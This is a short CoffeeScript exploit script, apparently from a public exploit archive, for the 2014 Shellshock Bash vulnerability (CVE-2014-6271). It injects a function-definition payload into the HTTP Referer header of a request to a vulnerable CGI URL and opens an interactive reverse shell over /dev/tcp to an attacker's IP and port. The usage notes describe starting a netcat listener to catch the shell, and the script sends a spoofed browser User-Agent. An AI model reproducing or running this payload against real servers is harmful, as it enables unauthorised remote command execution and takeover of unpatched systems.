# Exploit Title: Bash Environment Variable Code Execution Shell Exploit
# Date: September 26, 2014
# Exploit Author: Steve Lacy @SteveDeLacy
# Version:  2.x - 4.3-7
# Tested on: Linux  3.13.0-32-generic #57-Ubuntu SMP  x86_64 GNU/Linux
#   GNU bash, version 4.3-7 (x86_64-pc-linux-gnu)
# CVE : CVE-2014-6271
# Reference: http://security.stackexchange.com/a/68203/56437

# Usage:
#   netcat -l <your port>
#   coffee exploit.coffee <target url> <your ip> <your port>

# Example cgi file:
#  #!/bin/bash
#  echo "Content-type: text/plain"
#  echo
#  echo
#  echo "Vulnerable"




request = require 'request'

args = process.argv

url = args[2]
myip = args[3]
myport = args[4]

exploit = "() { :;};echo; /bin/bash -i >& /dev/tcp/#{myip}/#{myport} 0>&1"

headers =
  'Content-type': 'text/plain'
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.66 Safari/537.36'
  'Referer': exploit

request = request
  url: url
  timeout: 20000
  headers: headers
, (err, res, data) ->
  return console.log err if err?
  data = String data
  console.log data, 'Starting reverse shell'
